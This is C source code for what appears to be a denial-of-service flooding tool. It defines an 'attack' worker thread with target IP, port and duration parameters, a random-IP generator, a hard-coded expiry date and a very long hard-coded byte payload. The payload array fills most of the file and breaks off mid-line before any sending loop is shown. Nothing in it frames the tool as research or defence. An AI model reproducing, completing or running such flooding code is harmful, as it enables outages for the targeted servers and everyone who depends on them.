#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

// Function to generate a random IP address (IPv4)
void generate_random_ip(char *ip) {
    snprintf(ip, 16, "%d.%d.%d.%d",
             rand() % 256,
             rand() % 256,
             rand() % 256,
             rand() % 256);
}

// Function to check if the program has expired
void check_expiration_date() {
    struct tm expiration_tm = {0};
    expiration_tm.tm_year = 2025 - 1900;  // Year 2025
    expiration_tm.tm_mon = 0;             // January
    expiration_tm.tm_mday = 25;           // 25th day

    time_t expiration_time = mktime(&expiration_tm);
    time_t current_time = time(NULL);

    if (current_time >= expiration_time) {
        printf("This program has expired. Exiting.\n");
        exit(0);
    }
}

// Structure to hold attack parameters
typedef struct {
    char ip[16];
    int port;
    int duration;
} thread_data_t;

// Worker thread to perform the attack
void *attack(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t end_time = time(NULL) + data->duration;
    char payload[] = "\xb6\xa0\x0a\x02\x2d\x81\xc3\xd1\x3b\xe7\xe9\x6c\xae\x6b\xae\x4b\x3c\x34\x16\x8a\xaf\xac\x5c\x03\x79\xf1\xa7\xe0\x52\x9a\x95\x78\x07\xb4\x47\xdf\xae\x03\x09\x9e\x6a\x75\x73\xde\xc2\x1a\x35\xe6\xf2\xe7\x5f\x56\x1a\xee\xa4\x20\x95\xe9\x17\x3e\xca\x56\x0b\x50\x3d\xf2\x46\x8a\x3b\xf3\xc7\xc3\x73\xbf\x09\x2e\x22\x22\x93\xba\xdc\x3a\xf2\x1f\x3e\x8f\x9a\x87\xd9\x7b\x8a\x27\x31\x1b\x96\xe4\xfd\x1f\xc0\xf3\x34\x72\x4c\xc6\x9a\x60\x8c\x38\xe9\xb6\xfd\xf3\x39\xf6\x63\xae\x6f\xf4\xb5\x02\x4f\x33\xf6\x84\xd9\x8d\xc8\x10\x2d\x0a\xd0\x8f\xdc\x73\x4a\x6b\xfe\x5b\xbb\x9e\xfd\xaa\x68\x94\x27\xff\x4b\x62\xef\x4e\x4d\x83\xdc\x04\x07\xd6\x21\xd4\x4c\x8b\x88\xad\xae\xc8\xfa\x10\xc6\xe6\x13\x9a\xca\x83\x96\x43\x77\x7f\x5e\xc3\x51\x20\xfa\x98\xad\xf8\x15\x5d\xc9\xd4\x66\x2b\xe6\x9d\xa1\x77\xa7\xd2\x73\x19\xdf\x4b\xae\x00\xf5\x69\x4d\xbd\x63\x08\x13\x88\x8f\xdc\xd3\xc0\xc6\x45\x52\x9b\x07\x46\x08\x76\xa8\x6a\x08\x92\x00\x43\xa0\xc9\x36\x3c\x25\xbd\x2e\x02\xc9\x6d\xc4\xe5\x26\x17\xb6\x2a\x23\x1b\xea\x0f\x63\x50\xfa\x69\x2b\x76\x55\x88\xe5\x63\x0c\x1c\xd8\x51\xe4\xc1\x2b\xcf\xcc\x6d\x5c\x41\xe8\x9d\x3e\x5a\xe8\x7a\x7d\x4a\xc9\x50\xb3\x9c\xbf\xdb\x96\xbf\x7a\x17\x89\x03\xc9\x9e\x4b\xd9\xb7\x5d\xbb\x4f\x8d\x6b\xaf\xe9\x8b\x0d\x47\x9e\x26\xd5\x89\xef\xf0\x5f\xb1\x90\x24\x6c\xa7\xf0\x35\x41\x5d\xe0\xe9\xf1\x09\x35\x36\xb5\xc4\x59\xc6\x9b\xa1\x21\xd7\xa0\xf5\x9e\x2e\x6b\x35\x46\xf3\x3e\x63\x1f\x38\x85\xcb\x95\x42\xd3\xe2\xf2\xe7\xb9\xaf\x0c\x10\x3a\x73\xe2\xe6\x96\x1b\xd1\x78\x45\x7e\xf5\xc2\x19\x8b\xa8\x77\x68\xe5\xeb\xcf\xe2\x3f\x88\x6d\x1d\x89\x28\x7f\xfe\x37\x51\x8b\x6d\x18\x01\x2a\xd1\x38\x88\x39\x64\xeb\x1b\x47\x81\xc9\x25\x2c\x57\xa6\xd8\x11\x41\xba\x36\xea\xdf\x22\xc7\xba\x0f\x91\x46\xc0\x25\x40\xcb\x1b\x7d\xcf\x1b\x52\x6d\x95\xcd\xd8\xe1\x6e\xf6\x3b\x79\x5d\x70\x9c\x7d\xa0\x94\x20\x99\xfb\xac\x19\x5a\x5b\x25\x16\x3a\xbd\xa7\xab\x7e\x7e\x7a\x82\x2e\xb8\xe4\xee\x55\x80\x27\x0d\x9e\x53\x72\xc4\x0c\x2d\x8a\x57\xab\x83\x5d\x4b\xfc\x95\xf8\x9f\x2c\x29\x54\x33\x4c\x67\x3c\x67\xd1\xf5\x80\xef\x23\x70\xfc\xce\x78\x24\x76\xda\xd3\x66\x55\x75\x55\xb3\x49\x89\xf2\x55\x5b\x73\xa0\x24\xa1\x64\xea\x59\xc4\xbf\xfb\x01\xc5\xd1\xfa\x90\xc6\x51\xc3\x2d\xd9\x12\x35\x6c\xea\xa6\xe7\xc5\x70\x59\x10\x40\xe9\xff\x7a\x01\x6d\xf3\x45\x4d\xd5\xda\x1a\x2a\x1e\x5b\xf6\x20\xba\x89\x2c\xb6\x8e\xfd\x0f\xd5\x0a\x44\xa3\x6e\xb7\x94\x4b\x7b\x6d\x5c\x21\xaa\x03\xb2\xa1\x03\xb7\x0e\xec\x39\x72\x0a\x74\x54\xcf\xf0\x28\x38\x0a\xd3\x23\xc5\x5a\x53\xfa\xe2\x1b\x75\x73\xc7\x62\xa7\xdd\xda\xe7\x15\xa6\x5e\x2d\xec\x24\xc0\xd8\x2a\x9b\x60\xc8\x5e\x67\xcc\x28\x52\x70\x24\xa3\x5f\x14\x4b\x73\xbc\x63\x20\x76\xcf\x96\x8a\x1b\xfb\x26\xd0\xe4\xbd\x19\x47\xd6\x0d\x03\x8b\x78\x58\x75\x7b\x03\x28\x2e\xae\x20\xb9\x40\xe9\x4e\xa6\x95\x52\x33\xf9\xe8\x44\xae\xa5\x0b\xd6\x62\x51\x56\x92\xff\x2a\x46\x7a\xbb\x74\x7c\x62\x9a\xef\xe5\xfb\xef\xf0\x61\x6f\xf2\xe6\x9e\x76\xb3\xa9\xf8\xeb\x42\x80\xda\xae\x80\x9d\xd8\xcf\xd7\xba\xe4\x60\x35\x1f\x24\x6e\x88\x7f\xa2\x77\xc9\x32\x0c\x04\x01\xd7\x50\x32\xbd\xbe\x49\xd2\xec\xeb\x64\x2f\x0e\xdb\x1a\x37\xfa\x47\x13\xae\xa4\x35\x2d\x22\xbd\xe8\x3a\x82\x46\x75\x79\xa9\x6a\xee\x18\x5c\xc3\x90\xd4\x9b\xc0\x12\x44\x84\xab\xb2\x1f\x38\x92\xd6\xba\xd6\x32\x38\x9a\x47\x66\xef\x11\x2f\xf4\x0d\xbe\x9c\xba\x1c\xe5\xfc\x72\x8d\x76\xcb\xf9\xf9\x86\x6c\x1a\x8a\x48\x93\x8d\xf2\x1b\xbd\xfa\xba\xce\xe6\x76\x98\x45\x84\xf9\x0a\x45\x6c\x72\x7c\x28\x0e\x83\x44\x8f\x36\xe6\x07\x57\xae\xb8\xef\x17\xfa\x46\x30\xf1\xb6\xbe\x05\x76\x2e\x54\x3c\xc2\xc8\x64\xdf\xfa\x12\xe3\xb7\x82\x06\x18\x79\x1d\x30\xff\x74\xa7\x51\x9a\x35\x6b\x14\x30\x5e\x7b\x0f\x81\xb0\x24\xa9\x3a\xb3\x69\x89\x3e\xdd\x7d\x79\x1a\x82\x33\x3b\xba\x54\xee\x36\x79\xc1\x66\x59\x6e\x23\x03\x73\x85\x19\xca\x1d\xce\x9d\x18\x0c\x40\x65\x91\xa2\xf1\xee\xfd\x9a\x65\x75\xde\x10\x62\x42\x17\xad\x35\x54\x50\x45\xa0\x03\x43\x1f\xbd\x78\x96\xe9\x36\xdd\xb9\xa3\x32\x44\x33\x22\xc8\x11\x54\x01\xe8\x94\x37\x3c\xc0\xb3\xc8\xce\x77\x8b\xfd\xd0\xad\xb5\x37\x33\x6b\x2d\x03\xde\x47\xf6\x82\xdc\x28\xf9\x9a\xcd\xb1\x44\xfa\x5d\xe5\xe6\x42\x69\x70\xce\x4c\x3c\x24\x44\x8e\x88\x2e\x46\x99\xe2\x8f\xa8\xe8\xa1\xbf\x40\x27\x5d\xc2\x9e\xfa\x97\x49\x10\x28\xbf\x75\x1f\xfd\x72\x85\x48\x65\x2f\xe8\x2c\x7d\x1a\x1c\x85\x9e\x77\xb8\x54\x81\x56\x56\xde\xb8\xbc\x1e\x2c\xe1\x6d\x09\xa8\xd6\xc4\x9c\x7a\x21\xcb\x1d\xa4\x06\x3e\x8e\x59\x34\xa5\xf0\xd2\x18\x2c\xb8\xac\xb3\xc5\x82\x6d\x2c\x24\xf7\xad\x5e\xf7\x9c\x31\x25\xe1\x95\x8d\x66\xb5\x48\xeb\x72\x76\xff\x16\x69\x12\x77\x61\xc0\xde\x4a\x67\x58\x23\xf3\x34\x10\x16\x4c\x11\xf6\xc3\x8a\x7c\x43\x6b\xb8\x4b\x53\x0a\x29\x5a\xbf\x2c\xe3\xce\x4a\x7c\xc7\x6a\xe9\x34\x3d\xcf\x9a\xb8\x78\xbd\x1f\x0b\xe8\x4f\x41\x0c\x0c\xbb\xb8\x82\xd1\x7a\x35\x59\x14\x8c\x72\x30\x1c\xd3\xff\x60\x22\x2e\xbe\xe2\x1f\xf9\xd4\x13\x75\x57\xbe\x84\x06\x02\x28\xd3\xf3\x7e\xce\x31\xf5\xfc\xe6\x23\xf8\x7e\xc2\x48\x22\xb4\xd9\xfc\x45\x75\xd3\xab\x23\xa7\xa8\x7f\x92\xeb\xb8\xcc\x08\xc0\xe6\x2c\xaf\x9b\xd3\x18\xbf\xf3\x7b\x0e\x56\x3d\xb1\x31\xc0\x2b\x23\x30\xf2\x2f\x8b\x92\xf7\x07\xe3\x10\x47\x69\x64\x17\x58\x3a\x6c\x8b\x1a\x4b\xb7\x59\x0e\x5e\xa7\x37\xbc\xad\x9c\xf6\x44\x5a\x2e\x92\xfe\x2a\xc2\x07\xb4\x10\x1a\xfe\x75\x9d\x35\x2b\x05\xd1\x12\x9c\xab\x25\xc8\x98\x93\xbd\xe0\xdd\x39\xdb\xa9\x4e\xd3\x07\x8d\xce\xe0\xa0\xbc\xb9\xe8\x4f\x6e\x39\x57\xbd\x7f\x6d\xe5\x4a\xfe\x7c\xe9\x30\x8e\x39\xd6\x8d\xf8\xe9\x25\x8b\x93\x63\x1e\xf7\xaa\xd6\x2d\x75\x8e\x0d\x51\x51\xf9\xa2\x5b\x86\xc6\xbd\x52\xa1\xa5\xcc\x52\xdf\x0b\x70\x11\x23\xa7\x19\xe4\x5e\x46\x18\x7b\x1c\x2f\xd5\xd8\xee\xa7\x35\x16\xa4\x26\x01\xad\x1d\x2b\x0a\xed\x35\x68\xd3\xc1\x29\x0b\xd2\xc3\x91\x0a\x5e\x9c\x18\xd3\x4e\x34\xf1\x45\xfc\x25\x2c\xf8\x38\xd3\xcb\x66\x6c\xbb\x9d\x33\x05\x1b\x30\x23\xa9\x53\x6e\xf6\xb6\x24\x08\xcd\x74\x01\xa6\xb4\xec\x61\x55\x14\x8a\x13\xd9\xf3\x6e\xc1\x8e\x5e\x5d\xcd\xda\x8e\x6d\xc1\x3a\x05\x9f\x09\xda\x1c\xca\x49\xb4\x95\x1b\x7f\x96\x8f\x58\x7e\x16\x1a\xac\x9d\x67\xb3\x1b\x36\x30\xb5\x4a\x5f\xb0\x59\xd6\x25\xb7\xd2\x3e\xbd\x4c\xe1\x23\xfb\xdc\x0d\x41\xdc\x38\xc2\x11\xb3\x73\xee\xcf\xfa\x4b\xf3\xd3\xef\xf8\x11\x8c\x87\x2f\x76\xd8\xcb\x01\x94\xa4\x6f\x92\xfc\x5f\xb1\x54\x39\xd2\x69\x9a\x65\x58\x4c\xa5\x52\xf3\x0d\xef\xef\x4b\x8d\xef\x0b\xcb\xb4\x41\xcb\x57\xf3\x12\x36\xb9\xc1\xc6\xf6\x07\x79\xb2\xed\x73\x48\xde\xf5\x1d\xd0\xc8\x06\x13\xda\xa5\x19\x2a\xef\x64\xd4\xdb\xc0\x1e\x31\xcf\xeb\xe0\x9a\x16\xc6\x2a\x4c\x02\x7a\x66\x2e\xd2\xcf\x6a\xa9\xc5\x39\xdc\xc5\x19\x60\xe8\x64\x73\x79\xaa\xc6\xb3\x03\x63\xfb\x2c\x7b\xed\xa4\xac\xa2\xb5\xfc\x0a\x9d\x1c\xb8\xd2\xda\x37\x03\xda\x85\xd3\xbc\x34\xcc\xc0\x8b\xd2\x64\xc6\x80\x93\x37\xa6\x10\x89\x70\xa3\xe3\x42\xe7\xd5\x34\xf5\xe3\x06\x1c\xbc\x1d\x6e\x64\x0a\x5d\x06\x74\x84\x5d\x6d\xd8\x91\xc5\xe9\xe8\x32\xb1\xbe\xa0\xff\x0e\x26\xc2\xd8\xbb\x48\x7b\x19\x74\x18\x12\x5c\x38\xe4\x24\x7d\x9c\x57\xc4\x5e\xf1\xbd\x65\x7d\x50\x47\x76\xbf\xf6\x3a\x7c\xca\x9a\x51\x17\x16\x87\x82\xbc\xe7\x27\xc9\xd2\xca\x3d\x22\xcc\xa6\xbe\xdd\x2f\x7c\x08\x06\x67\x27\x9e\xf5\x6d\x90\xb4\x51\x5c\x94\xf5\x3e\x4b\x8f\xe8\xc0\xef\x9e\x67\xcb\xe3\xe2\x9c\xa1\x6c\xf8\x4f\x7e\x00\xc4\x98\x01\x7c\x44\x68\x73\xb7\xcd\x2a\x9d\x43\x11\x17\x06\x7b\x9a\x3b\xb6\x94\xcd\x93\x92\xe5\x55\xcc\x35\x8d\xbd\x12\xb4\x69\xfe\x66\x48\x55\xcb\x20\xfe\x15\x42\x06\xc4\x95\x55\x0c\x83\x17\x09\x43\x11\x61\xee\xf6\x1f\x0e\x13\x66\x10\xc6\xa2\xac\x1a\x07\xb0\xf0\x25\x92\xe2\x7c\xdb\xe9\xb7\xf0\x1c\x00\x8e\x78\x97\x60\x02\xe5\x68\x26\x74\x98\xfe\xc6\x4d\x97\xaf\x7d\xc9\x8c\xb0\x4b\xbd\x64\xf5\x6f\xac\x46\x48\x95\x65\x5b\xf9\x39\x35\x33\xf2\x8e\xce\xa2\x7e\xf3\xde\xa5\x3a\xf5\x8f\xb2\x83\xb0\xbe\x0c\x62\x3d\x0a\x5d\xef\xc1\x86\x27\x5b\xbd\x48\x70\x2c\x22\xdd\xe1\x4f\x8b\x23\x9e\x9c\x09\x94\xd3\xa3\x20\xfa\xea\x1a\xb2\xfd\xdc\x1a\xa9\x04\xd9\x7d\x95\x71\x9f\x46\xf1\x16\x9c\x03\xda\x09\x20\x04\x75\xc1\xb8\x2c\xca\x4c\x6e\x05\x01\x93\xa2\xe3\x76\x43\xc1\x14\x4a\xd2\x18\x9f\x05\xb6\xfe\xe5\x84\x00\x06\xb0\x15\x17\xb6\xfa\xb5\x69\x92\x5f\x4e\xb1\x3b\xf8\xfd\xa2\xe5\x38\xfd\x7f\x73\xd3\xaa\xaa\x93\x57\x41\x24\xfd\xbc\x5b\x9b\x06\x73\x48\xb8\x39\xf5\xb1\xee\xdb\xd1\xe0\xfc\xc0\x9b\xff\xf5\x2b\x9e\x17\x2d\xb7\xca\xdb\x7b\x3c\x71\x83\xd5\xdf\xf1\xa0\x36\x55\xaf\x84\xee\xd4\x2b\x14\xb7\xa5\x9f\x25\x20\xe9\x20\xbe\xb2\x64\xc1\x79\xd1\x27\xd7\xfa\xc6\x81\x89\x3c\xa0\xe9\x8e\xc0\xd4\xd3\x47\x16\xeb\x56\x98\x5b\x48\x1b\xd6\x0c\x1f\x80\xb9\x7f\x4f\x2b\xa5\x6a\x27\x50\xf7\x5f\xd0\x92\x6d\xd0\xbb\x98\x9b\x31\xa1\x7f\xc3\x92\xcc\x0c\xff\xf7\xbd\x48\x6b\x42\x0a\x0c\xaa\xac\x07\xcd\xaf\x08\x62\x2b\x18\xaf\x86\x36\x16\xc2\xf3\xa3\xb2\xc8\x3c\xb5\xad\x86\xba\x92\xeb\x0c\xe1\xf6\x06\xba\xfb\x3d\x1c\xb4\x66\xdc\xe1\x1e\x80\x4b\x70\x4e\x07\x0a\xa0\x77\xbe\xc3\xed\x61\xff\x67\x95\x83\xcc\xaa\xcf\xc0\x50\xf4\xbf\x5e\x13\xfb\x18\x7f\xc8\xd3\x0b\xc7\x33\x52\x0b\x6f\x19\x93\x53\x3d\x21\x6d\xf4\x65\xc6\xa7\xdb\xd6\x1f\x15\xaa\xce\xaa\xaf\x5d\x93\xb3\xfa\x22\x14\x18\x3f\x32\x77\xde\x36\x35\x4e\x56\xe2\x23\x17\x78\x71\x91\x53\xbb\x9d\xd2\x45\xc8\xb3\xee\x94\xb0\x94\x0f\xd9\x7f\xc9\x5c\xc8\xf4\xa7\x9f\xf5\x18\x7a\x59\x8d\x3d\xde\xdf\xd5\xc5\xdd\x82\xbd\x3b\xf9\x0b\x91\xca\x34\x5c\x19\xcd\xb9\xe8\x7e\x23\xd4\xf7\xe2\xc0\x88\x36\x2e\x2e\x85\x44\x86\x06\xf2\xbf\x91\x93\xbf\x21\x9e\x37\x2a\x03\xfa\x27\x5b\x4e\x3f\xf9\x96\x9d\x15\x8b\xbf\x2e\xbc\x85\x05\x91\x07\x5a\x38\x26\xfc\x20\x45\xf0\xb2\xca\xa2\xf8\x82\x05\x11\x46\x4b\xe8\xb7\xbb\x44\x34\x20\x25\x48\x22\x77\xc3\x89\xdf\x6d\x2a\xf8\x23\xfd\xbf\x6d\xa8\x4e\xac\x26\x54\x53\x4b\xf4\x10\x86\xd9\x81\x83\x3b\xc7\x2c\xd6\x8e\xb5\x72\xc8\x35\x2b\x2d\x05\xd7\xac\xd8\x63\x36\x5f\x01\x79\x82\x5f\x98\xd0\x8e\x7d\x3d\x44\x7b\x03\x40\x61\x50\xc6\x87\xbd\x3d\xcb\x79\xe0\x71\x8c\xe3\xdf\x39\x45\x6a\x48\x00\xf9\xe7\xc4\xa7\x4a\x76\x7a\x1b\xf5\xf5\xa9\x0e\x0b\xf6\x5a\xee\x83\xa2\x71\xbc\x09\x4f\x12\x95\xb4\x93\x36\x14\x9d\x12\xf1\x1c\x4d\x51\xc0\x4c\x07\x77\xaf\xdd\xcd\x68\x09\x8f\x89\x15\xca\xfa\xbc\xb9\xc1\x12\x05\x19\x0e\xd0\xb6\xd9\xe4\x5a\x73\xaf\x29\xc3\xee\x71\x43\x5d\x4c\x81\x35\x60\x83\x96\x0b\x09\xf3\x3e\x3c\x31\xf1\xfd\xc9\x8a\xb5\x38\x9c\xb5\xe4\x49\x53\x41\x57\xc0\x9a\xef\xcb\x79\xae\xbc\x2b\x88\xbe\x99\x79\x30\x36\xb9\xae\x2e\x28\x58\x6d\x03\xf6\x47\xf5\xaa\x05\xb2\x82\xa5\xd1\xf0\x41\x5b\x57\x82\xa2\xae\x3b\x0d\xd9\xac\x72\x52\xd3\x4f\x91\x11\x6b\xd2\xbe\x94\xa4\x05\x15\x4e\xee\x8d\xaf\xcb\xc3\x35\x3f\xa8\x87\xc2\xad\xa2\x33\x90\xee\x67\x12\xb6\x29\x59\xac\x6e\x82\xbc\x5d\x85\x22\x19\xb2\xe0\xec\x72\xc1\x29\x27\x4e\xa2\x63\x9f\x05\x8f\x91\x44\x08\xa8\xe3\x11\x54\xe0\xb9\x32\x3f\x4e\xe6\x0c\xf5\xbc\xbe\x82\x08\xc5\x2f\x8a\x20\x0e\xc3\xeb\x9f\xdf\x57\x41\x18\x89\xb8\xb6\x50\xfc\x72\x4f\x75\x8f\x07\xcf\x0b\x05\x14\xfc\x9d\x34\xdf\x29\xa0\x2e\xec\xb7\x76\x08\x7b\x81\xb3\x5a\x69\xb6\xfb\x30\x91\xd0\xf3\x8f\xcc\xc7\x39\x84\x6f\x96\xed\x04\xfd\x11\xf9\xb9\x6b\xb2\xf5\x85\x72\x75\xb4\x48\x31\x87\x12\xfb\x31\xe9\xfe\xc6\xdd\xef\x2f\x63\x9a\xdc\x83\xd0\x9a\x27\x96\x89\x75\x53\x52\x45\xb4\xdb\xc0\xf0\xfd\x46\xca\xde\x17\x16\x73\x2c\xb2\x41\x6f\x39\x3e\x08\x5e\x11\x23\xb1\x39\x7e\x2f\xed\x37\x26\xe6\xec\x9f\x98\xc4\xdf\x5c\x75\x39\x43\x8b\x81\x69\x9d\x81\xe7\x4b\xad\x60\x6a\x4a\x38\xea\x5a\x10\xee\x4a\xc2\x5f\x97\xe8\x0f\x17\xbc\x67\x06\x11\xb4\xed\xf4\xda\xe8\x33\x4d\x49\xd0\x27\x1f\x28\x50\x9f\x4e\xe3\x1c\xa6\xd1\x16\x8d\x1b\x5b\x48\x36\xfc\x85\xb0\x67\xf4\xf4\x84\x8d\x82\x86\x9c\x0f\x0b\xfa\x03\xd2\x2a\xc0\x62\x87\x9e\x70\x52\xad\x5d\xe0\x3d\x6b\xfe\xe0\x70\xfc\x5e\x4f\xb4\xa0\xd9\xa0\x8e\x08\x89\xf0\x45\xe7\x2f\x70\xc3\x6f\x10\x26\x9a\x97\x7a\xcb\x54\x41\xee\x60\xa1\x4c\xcd\xb3\x9c\xfc\x94\x22\x07\x01\x35\x68\x40\xcd\xdf\x60\x20\xa6\x9c\x2c\x47\x9a\xd7\xdf\x43\x76\x65\x40\xd9\x4b\x68\xa6\x1a\x00\xd0\xf8\x28\x15\x5f\x2e\x3b\x9a\x14\x15\xd0\xb5\x02\xf1\xce\xed\x25\x22\xea\x08\x7a\x2e\x59\xcb\xfc\xe0\xf6\x33\x18\xa3\x8e\x7b\x3d\xe5\x53\x25\x7f\x55\x2c\x5a\x23\xfa\x75\x92\x46\x04\x67\x87\x2f\x04\x26\x3a\xcc\x78\x09\x48\x78\x01\x89\x40\xeb\x7e\xf2\xb0\xf6\x0c\xb1\xa2\x18\x51\xc5\xf3\x32\x4d\x47\xc1\x88\x2d\xf1\xef\x4a\xe7\x48\x81\x9e\x40\x9b\xc7\x56\xfb\xd3\x00\xfc\xb5\x8a\x44\x45\x6c\x0e\x6f\xa6\xcd\x8b\x57\x0c\xbe\x3b\xa2\x73\x2e\x62\x2d\xdb\x6f\x3c\x76\x46\xfe\x20\x75\x3f\xcf\x1f\x67\xec\x78\x1f\xdc\x46\x9a\x6c\x2b\x29\xa1\x36\xa2\x82\x8b\x0a\x57\x37\x2b\x1f\x57\xd3\xe1\x55\xe8\x67\xf6\x37\xc8\x5d\x5b\xeb\xcc\x79\xb9\x40\x00\x20\x11\xa3\x04\xc3\x01\xbb\xcc\xae\xcc\xa4\xee\xef\x03\xce\x53\x1a\x43\x14\x1c\x0a\x4a\x88\xa5\x18\x3f\x5c\x7c\x00\xba\x23\xff\x27\x22\x6c\xa3\xca\x5c\x23\xc8\x98\x6c\x7e\x36\x05\xee\xce\xd0\x7c\xe7\xba\x1c\x6c\x96\x5c\xd5\xbe\x0d\xd2\xa1\x92\x26\xeb\x17\xcf\x36\xd9\x99\xdd\x0c\xd6\x69\x1a\x65\xb6\x56\xfc\x93\xc2\x41\xa6\xc7\x7a\xb8\x69\xd4\x91\x83\x3d\xff\x9f\x7d\xaf\x05\x61\xfa\xcb\x5d\x81\x03\x5c\x2a\x60\x6e\xdb\xb8\x99\x16\x3b\x47\xb8\x9b\x9c\xb6\xcc\xe5\x7c\xeb\x2a\x6a\xdf\x1d\x98\x7b\xb1\x5d\x67\xb2\xc1\x57\x8d\x4e\x39\x43\xdb\x90\x91\xe3\xa3\x8b\x7c\x13\xbc\xef\xa7\x4d\xb9\x22\x3f\x0f\x49\xd1\x21\x22\xf5\x27\xbc\xa7\x60\xb0\xdb\x3d\x1c\xfb\x2a\x8e\x3e\x9d\xfa\x90\xc3\x6b\xce\x83\x69\x3f\x67\x8d\x46\xc1\xbf\x6b\xf1\x17\x01\x29\x83\x3a\x12\xc8\x62\x73\xce\x43\xdb\x4a\x94\x00\x85\xf2\x88\x32\xc9\xa9\x32\x63\x1c\x4f\x10\xc0\xe3\x9a\xd0\xea\xab\xf6\x78\xa1\xf3\x41\x8b\xd5\x10\x5f\x45\xcd\x4e\xd5\x76\xaf\x1b\x71\xc6\x38\xb5\x58\x61\x74\x03\xc5\x1f\x94\x69\x87\xe2\x21\x3a\xae\xca\x2b\x66\x56\x49\xd3\xc5\x45\x6d\x71\x41\x78\x07\x99\xa7\xf5\x4d\x29\x08\xe6\xa1\xa9\x1e\x20\x07\x0a\xeb\xe0\x3e\xaa\x0b\x10\x78\x42\x0b\xe9\xe7\xe0\x82\x62\x63\x9c\x2f\xcf\xd7\xea\x45\xd0\x17\xf8\xd1\xf3\x51\x7a\x05\x72\x5d\xda\x88\xd6\xff\xf0\xd8\xd9\x3e\x14\x60\x0c\x01\x1f\x72\xde\xed\x06\xf8\xa8\x04\xe0\xbc\xe8\x07\x61\x13\xf9\x6e\x60\x43\x7c\xdc\x36\xd4\xdc\xf5\x59\x16\x05\x83\x13\xfa\xe3\xee\xff\x2d\xd2\x12\xb0\xca\x8d\xad\x49\x36\xdf\x5a\xea\x8a\x52\x0d\xa3\x24\xa8\x43\xbb\x1f\x05\x12\xf8\x5d\xc3\x52\xa6\xec\xa5\x6b\x94\x03\x29\xb7\x77\x7e\x5b\xed\xa6\x77\xc8\xcc\x4e\x9c\xb9\x10\xea\xc1\x7a\x07\x2d\x21\xd5\x44\x2f\xe0\x61\x11\x8c\x20\x68\xc2\xfe\x7c\x90\x0e\x90\x7b\x66\x5d\xf4\xcf\xbc\x97\x43\xee\x5c\x2c\x7e\x39\xbd\x71\x00\xb7\x7e\x67\x02\xe8\xa9\x61\xe8\xbf\x34\xa6\x2e\xcb\x61\x79\xbc\x41\x46\x1b\x04\xc7\x07\x8b\xe2\xa0\x06\x5d\xc8\xf7\x6d\xc6\xfa\x6b\xaf\xaa\x59\x4b\x21\xf7\x26\x39\xf6\x5a\xf5\xfd\xfc\x31\x3e\xc8\xd5\xa0\xd4\x7e\x27\x52\xc1\x12\xda\x5d\x4c\x6e\x8a\x60\x6f\x6e\x29\x12\x62\x5c\x49\xa3\xab\x83\xdc\x29\x4b\x31\x3d\xf1\x2f\xdd\x83\x14\xab\xf4\x56\x48\x68\xe5\xd3\xc9\xc6\x64\x6a\xa4\x8d\x88\x21\x49\x5a\xfc\xce\x58\xf9\x8c\x97\x9d\x9e\xe8\x91\x1a\xec\xbf\xef\xf0\xce\x66\x3e\x35\x79\xb7\xb0\x5a\x4a\x12\xe3\x3f\x8e\xe4\x64\xd5\xba\x6b\xf1\xfc\xdb\xa7\x83\xb5\x4f\x92\x3c\x15\x9e\xd0\x4d\x4d\x44\x1d\xe9\x89\x87\x45\xe2\x73\xa1\x9a\xe7\xee\x11\x6f\xbb\xbe\x30\x29\x58\x80\x88\x68\xbd\xaa\x6a\xc9\x6e\xf9\x34\xdd\xce\x51\x41\x60\x84\x2c\x63\x37\xf9\x8c\xa5\xa1\x14\x61\x73\xc5\x1e\x68\x33\xc9\xf5\xbe\xb5\xb1\xcb\x13\xd0\x06\x2c\xca\x16\xeb\xf9\x96\x0f\x5d\x2f\x9f\x75\xe6\x8b\x11\x60\xc6\x5b\xf3\x4f\xbf\x0b\x71\x9e\xee\xcf\x0e\x4c\x35\xab\x0a\x78\xbf\x35\x2e\xad\xb8\x5a\xb8\xa8\x9d\x61\x8f\x86\xd8\xa5\x94\xa9\x75\x88\xb6\xdb\xd0\x3c\xd2\x4f\xe8\x61\xa4\x94\x1c\x2e\x28\x5f\xfc\x65\xc9\xa7\x8e\xfc\x44\x3b\x5a\x83\x48\x94\x3c\x3f\x35\x42\x0b\x9d\x60\x85\x55\x5c\x00\x17\x42\x8b\x15\x59\x9f\xce\xd6\xaa\x6a\x15\x8c\x77\x5b\xee\xf1\xba\x0a\x91\xd3\xd6\x44\xd2\x95\x46\xb5\x38\x59\x7b\xb8\xba\xff\x4e\x8e\xea\x12\xaf\xcf\xe4\x28\x42\xaf\x19\xe1\x7d\x62\xd4\xf9\xfb\x35\x3d\x3b\xd3\x55\xcc\x16\x11\x95\xb7\x62\x02\x64\xd0\x2e\xcd\xfc\x1b\x77\xda\xfe\x9c\xa8\x01\x52\x5d\x74\x60\x96\x7d\xa8\xfd\x4a\x2c\x67\x6a\x3c\x2f\x73\x51\xbb\x23\x8d\xc5\x65\xf0\x46\xe9\x2d\x8c\x89\x17\x6f\x7b\x57\x56\x0a\x92\xfd\xf1\x6c\xd9\x1f\xbe\xf6\x47\x22\x49\x2b\xdd\xcf\x5f\x8d\x2e\xef\xfa\xde\x7a\x9b\x7a\xd8\xd7\xa2\xc4\x8f\xa5\x8b\x4a\x23\xd8\xab\x05\x85\x5f\x5f\xda\xf2\x54\xbd\x60\x93\x22\x99\xa1\x73\x48\xb2\x7d\x70\xc3\x64\x73\x9c\x79\xe4\x01\x75\xa9\x82\x4d\xe6\x81\x87\x3a\xa8\x25\x5c\xca\x7d\x33\x49\x44\xa3\x99\x5e\x4a\xc4\x69\x54\xeb\x1c\x89\xdb\xfa\xe6\x62\x26\x6c\x60\x89\xde\x82\x8e\xcf\xcd\x86\x5b\x75\x68\x1f\xc8\x29\x43\x21\x05\x03\x09\x89\x31\x8e\x1a\xa4\x9e\x2f\xe9\x2b\xd5\x17\x2d\xd9\xc0\xd3\x28\x9a\x62\x55\x48\x66\xbd\x1b\x16\xbe\x28\x75\x0b\x6c\x16\x3f\xd6\xf5\xe5\x2b\xbf\x56\x97\x6a\xe7\x42\x9d\x50\xc6\x94\x70\xb3\x71\xa2\xbb\xc6\xa6\xe6\x0b\x29\x80\xbd\x55\x13\xf7\x50\x5d\x2f\x2e\x1b\x9f\x2e\xae\x3d\xf2\x38\x87\x94\x59\x57\x9c\x1c\x2e\xdc\xa3\xaa\x3a\x09\x89\x95\x01\x06\xb8\x2e\x5e\xd6\x24\x7e\xb5\xb4\xdf\x8f\x07\xef\x